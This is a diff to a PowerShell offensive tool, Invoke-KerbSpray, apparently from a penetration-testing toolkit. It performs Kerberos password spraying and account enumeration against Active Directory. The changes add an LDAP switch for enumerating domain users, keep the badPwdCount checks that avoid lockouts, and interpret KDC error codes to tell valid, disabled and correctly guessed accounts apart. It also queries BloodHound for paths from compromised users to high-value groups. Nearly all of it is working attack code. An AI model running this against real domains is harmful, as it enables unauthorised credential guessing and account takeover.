@@ -18,7 +18,7 @@ function Invoke-KerbSpray {
     Specifies a file containing a list of usernames to send the AS-REQ for.
 
 .PARAMETER Password
-    Specifies the password for authentication.
+    Specifies the password for authentication attempts.
 
 .PARAMETER Hash
     Specifies the NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.
@@ -32,17 +32,20 @@ function Invoke-KerbSpray {
 .PARAMETER Server
     Specifies a specific domain controller to send the AS-REQ to.
 
+.PARAMETER Ldap
+    Enables domain account enumeration via LDAP.
+
 .PARAMETER LdapUser
-    Specifies the username for enumerating domain accounts via LDAP.
+    Specifies the username to use for LDAP bind.
 
 .PARAMETER LdapPass
-    Specifies the password for enumerating domain accounts via LDAP.
+    Specifies the password to use for LDAP bind.
 
 .PARAMETER Limit
     Specifies the maximum value of the badPwdCount attribute of the target users enumerated via LDAP.
 
 .PARAMETER Delay
-    Specifies delay between authentication attemps.
+    Specifies delay between authentication attempts.
 
 .PARAMETER Jitter
     Specifies jitter for the authentication delay, defaults to +/- 0.3
@@ -72,7 +75,7 @@ function Invoke-KerbSpray {
     PS C:\> Invoke-KerbSpray -DumpFile .\contoso.ntds -Domain ADATUM.CORP -BloodHound
 
 .EXAMPLE
-    PS C:\> Invoke-KerbSpray -Password 'Welcome2020' -Domain ADATUM.CORP -LdapUser testuser -LdapPass 'P@ssw0rd'
+    PS C:\> Invoke-KerbSpray -Ldap -Password 'Welcome2020' -Domain ADATUM.CORP
 #>
 
     [CmdletBinding()]
@@ -84,13 +87,6 @@ function Invoke-KerbSpray {
         [ValidateScript({Test-Path $_ -PathType Leaf})]
         [String]
         $UserFile,
-
-        [String]
-        $Password,
-
-        [ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})]
-        [String]
-        $Hash,
 
         [ValidateScript({Test-Path $_ -PathType Leaf})]
         [String]
@@ -104,6 +100,9 @@ function Invoke-KerbSpray {
         [String]
         $Server,
 
+        [Switch]
+        $Ldap,
+
         [String]
         $LdapUser,
 
@@ -112,6 +111,13 @@ function Invoke-KerbSpray {
 
         [Int]
         $Limit = 1,
+
+        [String]
+        $Password,
+
+        [ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})]
+        [String]
+        $Hash,
 
         [UInt32]
         $Delay = 0,
@@ -155,45 +161,35 @@ function Invoke-KerbSpray {
 
     $credentials = New-Object System.Collections.ArrayList
     if ($Username) {
-        if ($LdapUser) {
+        if ($Ldap) {
             $user = Get-LdapUser -Identity $Username -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
             if ($user) {
                 $badPwdCount = $user.badPwdCount
             }
-            else {
-                Write-Error "User $($user.samAccountName) does not exist"
-            }
         }
-        $cred = @{Username = $Username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
-        $credentials.add($cred) | Out-Null
+        if ($Ldap -and -not $user) {
+            Write-Error "$($username)@$($Domain) does not exist"
+        }
+        else {
+            $cred = @{Username = $Username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
+            $credentials.add($cred) | Out-Null
+        }
     }
     elseif ($UserFile) {
         $UserFilePath = Resolve-Path -Path $UserFile
         ForEach ($username in Get-Content $UserFilePath) {
-            if ($LdapUser) {
+            if ($Ldap) {
                 $user = Get-LdapUser -Identity $username -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
                 if ($user) {
                     $badPwdCount = $user.badPwdCount
                 }
             }
-            if ($LdapUser -and -not $user) {
+            if ($Ldap -and -not $user) {
                 Write-Verbose "$($username)@$($Domain) does not exist"
             }
             else {
                 $cred = @{Username = $username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
-            }
-        }
-    }
-    elseif ($LdapUser) {
-        $users = Get-LdapUser -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
-        ForEach ($user in $users) {
-            if ($user.badPwdCount -le $Limit) {
-                $cred = @{Username = $user.samAccountName; Password = $Password; Hash = $Hash; BadPwdCount = $user.badPwdCount}
-                $credentials.add($cred) | Out-Null
-            }
-            else {
-                Write-Host "[!] Skipping user $($user.samAccountName)@$Domain because its 'badPwdCount' is $($user.badPwdCount) (> $Limit)"
             }
         }
     }
@@ -212,8 +208,20 @@ function Invoke-KerbSpray {
             }
         }
     }
+    elseif ($Ldap) {
+        $users = Get-LdapUser -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+        ForEach ($user in $users) {
+            if ($user.badPwdCount -le $Limit) {
+                $cred = @{Username = $user.samAccountName; Password = $Password; Hash = $Hash; BadPwdCount = $user.badPwdCount}
+                $credentials.add($cred) | Out-Null
+            }
+            else {
+                Write-Host "[!] Skipping user $($user.samAccountName)@$Domain because its 'badPwdCount' is $($user.badPwdCount) (> $Limit)"
+            }
+        }
+    }
     else {
-        Write-Error "UserName, UserFile, DumpFile or LDAP parameters must be specified" -ErrorAction Stop
+        Write-Error "Either UserName, UserFile, DumpFile or Ldap parameter must be specified" -ErrorAction Stop
     }
 
     ForEach ($cred in $credentials) {
@@ -232,15 +240,18 @@ function Invoke-KerbSpray {
 
         $Tag = $asn_AS_REP.TagValue
         # ERR_PREAUTH_REQUIRED
-        # https://tools.ietf.org/html/rfc1510#section-8.3
         if ($Tag -eq 30) {
             $temp = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
             $error_code = [Convert]::ToUInt32($temp.Sub[0].GetInteger())
 
+            # KDC_ERR_C_PRINCIPAL_UNKNOWN
+            if ($error_code -eq 6) {
+                Write-Verbose "$($cred.Username)@$($Domain) does not exist"
+            }
             # KDC_ERR_PREAUTH_REQUIRED
-            if ($error_code -eq 25) {
+            elseif ($error_code -eq 25) {
                 $output = "[+] $($cred.Username)@$($Domain) exists"
-                if ($LdapUser) {
+                if ($Ldap) {
                     Write-Verbose $output
                 }
                 else {
@@ -251,17 +262,13 @@ function Invoke-KerbSpray {
             elseif ($error_code -eq 18) {
                 Write-Host "[-] $($cred.Username)@$($Domain) account disabled or locked out"
             }
-            # KDC_ERR_C_PRINCIPAL_UNKNOWN
-            elseif ($error_code -eq 6) {
-                Write-Verbose "$($cred.Username)@$($Domain) does not exist"
-            }
             # KDC_ERR_KEY_EXPIRED
             elseif ($error_code -eq 23) {
                 if ($BloodHound) {
                     $pathNb = 0
                     $bhPath = $null
                     $query = "
-                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[r*1..]->(m)) 
+                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                     RETURN COUNT(p) AS pathNb
                     "
                     try {
@@ -282,7 +289,7 @@ function Invoke-KerbSpray {
             # KDC_ERR_PREAUTH_FAILED
             elseif ($error_code -eq 24) {
                 $newBadPwdCount = $null
-                if ($LdapUser) {
+                if ($Ldap) {
                     $newBadPwdCount = (Get-LdapUser -Identity $cred.Username -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
                 }
                 if (($newBadPwdCount -ne $null) -and ($newBadPwdCount -eq $cred.BadPwdCount)) {
@@ -299,7 +306,7 @@ function Invoke-KerbSpray {
                     $pathNb = 0
                     $bhPath = $null
                     $query = "
-                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[r*1..]->(m)) 
+                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                     RETURN COUNT(p) AS pathNb
                     "
                     try {
@@ -324,6 +331,7 @@ function Invoke-KerbSpray {
             elseif ($error_code -eq 14) {
                 Write-Warning "$($cred.Username)@$($Domain) preauthentication failed because KDC has no support for encryption type"
             }
+            # https://tools.ietf.org/html/rfc1510#section-8.3
             else {
                 Write-Warning "Unknown error code for '$($cred.Username)@$($Domain): $error_code"
             }
@@ -344,7 +352,7 @@ function Invoke-KerbSpray {
                     $pathNb = 0
                     $bhPath = $null
                     $query = "
-                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[r*1..]->(m)) 
+                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                     RETURN COUNT(p) AS pathNb
                     "
                     try {
